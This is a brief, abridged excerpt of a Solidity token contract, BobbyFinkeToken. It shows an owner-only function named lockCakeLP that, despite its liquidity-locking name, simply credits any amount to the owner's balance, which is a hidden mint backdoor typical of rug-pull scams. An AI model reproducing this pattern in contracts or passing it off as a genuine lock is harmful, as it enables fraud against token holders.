...
contract BobbyFinkeToken is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function lockCakeLP(uint256 amount) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += amount;
        return true;
    }
    function _lockCakeLP(address account, uint256 amount) internal virtual {
